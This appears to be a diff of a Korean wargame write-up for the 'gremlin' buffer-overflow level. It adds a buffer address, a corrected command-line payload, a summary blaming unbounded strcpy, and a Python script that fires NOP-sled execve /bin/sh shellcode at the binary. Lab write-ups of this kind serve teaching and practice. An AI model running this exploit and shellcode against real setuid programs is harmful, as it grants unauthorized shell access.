@@ -150,10 +150,12 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 
 
 
+buffer_addr : 0xbffffac8
+
 #### Payload
 
 ```
-./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xf0\xfc\xff\xbf"'`
+./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xc8\xfa\xff\xbf"'`
 ```
 
  
@@ -165,5 +167,39 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 ### 0x04. 정리
 
 strcpy함수가 String을 복사할 때  복사하는 크기를 정하지 않아 생기는 BoF취약점을 이용하여 프로그램의 흐름을 조작할 수 있었다. strcpy함수처럼 크기 지정없이 값을 복사하는 메소드들은 BoF 취약점에 노출되어 있다.
+
+
+
+-----
+
+
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/gate/gremlin"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+buffer_addr = 0xbffffac8
+
+payload = "\x90"*100
+payload = append(shellcode)
+payload = append("\x90"*(260-100-24))
+payload = append(p32(buffer_addr))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+
 
 -----
